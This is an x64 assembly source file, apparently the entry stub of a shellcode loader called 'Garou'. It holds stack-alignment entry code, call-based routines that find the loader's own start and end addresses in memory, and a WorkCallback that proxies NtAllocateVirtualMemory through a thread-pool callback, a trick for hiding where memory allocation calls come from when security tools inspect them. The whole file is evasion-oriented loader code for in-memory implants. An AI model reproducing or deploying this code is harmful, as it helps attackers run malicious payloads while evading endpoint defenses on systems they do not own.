global Start
global GarouStart
global GarouRipEnd

extern GarouLdr

[SECTION .text$A]
    Start
        push rsi
        mov  rsi, rsp
        and  rsp, 0x0FFFFFFFFFFFFFFF0
        sub  rsp, 0x20
        call GarouLdr
        mov  rsp, rsi
        pop  rsi
        ret 

    GarouStart:
        call GarouPtrStart
        ret

    GarouPtrStart:
        mov	rax, [rsp] 
        sub rax, 0x1b  
        ret            

[SECTION .text$B]
    WorkCallback:
        mov rbx, rdx                ; backing up the struct as we are going to stomp rdx
        mov rax, [rbx]              ; NtAllocateVirtualMemory
        mov rcx, [rbx + 0x8]        ; HANDLE ProcessHandle
        mov rdx, [rbx + 0x10]       ; PVOID *BaseAddress
        xor r8, r8                  ; ULONG_PTR ZeroBits
        mov r9, [rbx + 0x18]        ; PSIZE_T RegionSize
        mov r10, [rbx + 0x20]       ; ULONG Protect
        mov [rsp+0x30], r10         ; stack pointer for 6th arg
        mov r10, 0x3000             ; ULONG AllocationType
        mov [rsp+0x28], r10         ; stack pointer for 5th arg
        jmp rax

[SECTION .text$C]
    GarouRipEnd:
        call GarouPtrEnd
        ret

    GarouPtrEnd:
        mov rax, [rsp]  
        add	rax, 0xb    
        ret             

[SECTION .text$D]
    SymGarouEnd:
        DB 'G', 'A', 'R', 'O', 'U', '-', 'E', 'N', 'D'